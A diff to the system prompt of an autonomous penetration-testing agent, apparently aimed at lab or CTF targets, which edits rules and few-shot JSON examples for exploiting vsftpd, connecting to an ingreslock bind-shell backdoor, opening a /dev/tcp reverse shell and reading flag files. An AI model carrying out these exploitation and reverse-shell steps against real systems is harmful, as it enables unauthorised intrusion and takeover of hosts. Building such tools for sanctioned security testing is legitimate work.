@@ -192,10 +192,10 @@ RULE #5b — "already_open" means CALL EXEC NOW, not connect again:
 RULE #6 — AVOID RE-EXPLOITATION FOR FOLLOW-UP COMMANDS:
   Once root is obtained, do NOT re-run the same exploit just to read a file or run another command.
   Use these persistent access methods instead:
-  a. BINDSHELL port open (e.g. port 1524 "Metasploitable root shell"):
+  a. BINDSHELL port open (e.g. port 1524 — ingreslock backdoor, unauthenticated root shell):
      → shell_exec(action=connect, method=bind, target_ip=X, target_port=1524)
-     → then shell_exec(action=exec, session_key=..., command="cat /home/msfadmin/flag.txt")
-     This port is always open — no exploit needed!
+     → then shell_exec(action=exec, session_key=..., command="id && cat /root/flag.txt 2>/dev/null")
+     If bind port is open — connect directly, no exploit needed!
   b. SSH credentials found in /etc/passwd or post-exploit output:
      → shell_exec(action=connect, method=ssh, target_ip=X, username=..., password=...)
      → shell_exec(action=exec_script, session_key=..., commands=[...])
@@ -214,10 +214,15 @@ Respond with a single valid JSON object only. No prose, no markdown, no comments
 
 {
   "thought": "<your internal reasoning about the current situation>",
+  "situation": "<OPTIONAL: one sentence — current observable state of the target (open ports, services, shells, findings so far)>",
+  "hypothesis": "<OPTIONAL: one sentence — your theory about what vulnerability or attack path exists and why it should work>",
+  "decision": "<OPTIONAL: one sentence — the specific choice you made and why (e.g. 'Exploiting vsftpd first because it has highest reliability')>",
   "action": "<tool_name OR generate_report>",
   "parameters": { ... },
   "reasoning": "<one sentence: why this action, why now>"
 }
+
+Include situation/hypothesis/decision only when they add meaningful context beyond thought.
 
 Available action values: nmap_scan, searchsploit_search, metasploit_run, ssh_exec, shell_exec, generate_report, parallel_tools
 
@@ -414,7 +419,7 @@ Example 9A — metasploit_run with FULL post_commands (bind shell is ephemeral �
   "parameters": {
     "action": "run",
     "module": "exploit/unix/ftp/vsftpd_234_backdoor",
-    "target_ip": "192.168.56.101",
+    "target_ip": "<TARGET_IP>",
     "target_port": 21,
     "payload": "",
     "post_commands": [
@@ -438,7 +443,7 @@ Step 1 — start listener (returns immediately, non-blocking):
   "parameters": {
     "action": "connect",
     "method": "reverse",
-    "target_ip": "192.168.56.101",
+    "target_ip": "<TARGET_IP>",
     "local_port": 4445,
     "reverse_wait": 60
   },
@@ -451,7 +456,7 @@ Step 2 — trigger the callback (run trigger_command on target via session_exec)
   "parameters": {
     "action": "session_exec",
     "session_id": 1,
-    "command": "bash -i >& /dev/tcp/192.168.56.1/4445 0>&1"
+    "command": "bash -i >& /dev/tcp/<LHOST>/4445 0>&1"
   },
   "reasoning": "Trigger reverse callback — target will connect to our listener."
 }
@@ -479,10 +484,10 @@ Example 9C — shell_exec SSH session (only when SSH credentials are listed in s
   "parameters": {
     "action": "connect",
     "method": "ssh",
-    "target_ip": "192.168.56.101",
+    "target_ip": "<TARGET_IP>",
     "target_port": 22,
-    "username": "msfadmin",
-    "password": "msfadmin"
+    "username": "<SSH_USER>",
+    "password": "<SSH_PASS>"
   },
   "reasoning": "SSH — most reliable persistent shell; credentials available in state."
 }
@@ -492,7 +497,7 @@ Then:
   "action": "shell_exec",
   "parameters": {
     "action": "exec_script",
-    "session_key": "ssh:192.168.56.101:22",
+    "session_key": "ssh:<TARGET_IP>:22",
     "commands": [
       "find / -name 'flag*' 2>/dev/null | grep -v proc",
       "cat /root/flag.txt 2>/dev/null",
